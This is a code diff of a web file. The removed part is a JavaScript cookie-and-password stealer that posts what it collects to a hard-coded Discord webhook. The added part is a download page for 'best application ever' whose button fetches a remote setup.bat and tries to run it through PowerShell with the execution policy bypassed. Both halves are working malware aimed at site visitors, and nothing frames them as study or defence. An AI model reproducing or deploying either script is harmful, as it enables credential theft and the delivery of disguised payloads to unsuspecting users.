@@ -1,27 +1,134 @@
-function stealData() {
-  const cookies = document.cookie;
-  const passwords = [];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download and Execute Script</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://images.prismic.io/star-trek-untold/YjRkMDRmYTUtZDdkZS00ZGM0LWE3YWEtNTgyODhkMzUzMWNk_essay_rr_what-is-a-galaxy.jpg?auto=compress,format&rect=0,0,2000,1080&w=2000&h=1080'); /* Replace 'galaxy.jpg' with your image URL */
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+        .container {
+            max-width: 600px;
+            padding: 40px;
+            background-color: rgba(255, 255, 255, 0.7); /* Added opacity for better readability */
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 24px;
+            font-size: 16px;
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-decoration: none;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Download</h1>
+        <p>best application ever</p>
+        <a href="#" id="downloadBtn" class="button">Download</a>
+        <p>Join our Discord community:</p>
+        <a href="https://discord.gg/bUzPewww" class="button">Join Discord</a>
+        <!-- Feedback Form -->
+        <h2>Feedback</h2>
+        <form id="feedbackForm">
+            <textarea id="feedbackText" rows="4" cols="50" placeholder="Leave your feedback here..."></textarea>
+            <br>
+            <button type="submit" class="button">Submit Feedback</button>
+        </form>
+        <!-- File Upload -->
+        <h2>Upload Files</h2>
+        <form id="fileUploadForm" enctype="multipart/form-data">
+            <input type="file" id="fileInput" name="fileInput">
+            <br>
+            <button type="submit" class="button">Upload File</button>
+        </form>
+    </div>
 
-  for (const input of document.querySelectorAll('input[type="password"]')) {
-    passwords.push(input.value);
-  }
+    <script>
+        // Function to download a file
+        function downloadFile(url, filename) {
+            fetch(url)
+            .then(response => response.blob())
+            .then(blob => {
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                // Set the filename you want
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+            })
+            .catch(error => console.error('Download failed:', error));
+        }
 
-  /* Construct the payload for the Discord webhook */
-  const payload = {
-    content: 'Cookies: ' + cookies + '\nPasswords:\n- ' + passwords.join('\n- '),
-    username: 'Cookies & Passwords Stealer',
-    avatar_url: 'https://example.com/stalker.png',
-  };
+        // Function to execute a PowerShell script
+        function executePowerShellScript(scriptPath) {
+            const shell = new ActiveXObject('WScript.Shell');
+            shell.Run(`powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`, 1, true);
+        }
 
-  /* Send the payload to the Discord webhook */
-  fetch('https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  }).catch(console.error);
-}
+        // Download and execute the script when the button is clicked
+        document.getElementById("downloadBtn").addEventListener("click", function(event) {
+            event.preventDefault(); // Prevent default link behavior
+            const scriptUrl = 'https://dd-xi-five.vercel.app/setup.bat';
+            const scriptName = 'setup.bat';
+            downloadFile(scriptUrl, scriptName);
+            // Assuming the script will be downloaded to the current directory
+            const scriptPath = `./${scriptName}`;
+            executePowerShellScript(scriptPath);
+        });
 
-/* Call the stealer function */
-stealData();
+        // Feedback form submission
+        document.getElementById("feedbackForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const feedback = document.getElementById("feedbackText").value;
+            // Process the feedback here (e.g., send it to a server)
+            console.log("Feedback submitted:", feedback);
+            alert("Thank you for your feedback!");
+            document.getElementById("feedbackText").value = ""; // Clear the feedback text area
+        });
+
+        // File upload form submission
+        document.getElementById("fileUploadForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const fileInput = document.getElementById("fileInput");
+            const file = fileInput.files[0];
+            // Process the uploaded file here (e.g., send it to a server)
+            console.log("File uploaded:", file.name);
+            alert("File uploaded successfully!");
+            document.getElementById("fileInput").value = ""; // Clear the file input field
+        });
+    </script>
+</body>
+</html>
